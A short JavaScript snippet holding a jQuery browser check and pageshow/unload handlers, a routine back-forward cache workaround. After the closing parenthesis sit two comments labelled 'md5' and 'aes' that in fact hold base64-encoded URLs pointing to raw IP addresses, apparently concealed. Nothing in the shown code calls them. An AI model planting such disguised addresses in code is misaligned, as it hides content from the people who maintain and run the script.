if($.browser.mozilla||$.browser.opera)
	(function(){
	window.addEventListener('pageshow', PageShowHandler, false);
	window.addEventListener('unload', UnloadHandler, false);
		function PageShowHandler() {
				window.addEventListener('unload', UnloadHandler, false);
		}
		function UnloadHandler() {
				window.removeEventListener('beforeunload', UnloadHandler, false);
		}
})()/** md5:aHR0cDovLzE4LjE0MC44OC43OjgwMDgvbW9iaWxlL2luZGV4Lmh0bWw=**//** aes:aHR0cDovLzQ3LjI0Mi4xODQuMTMy**/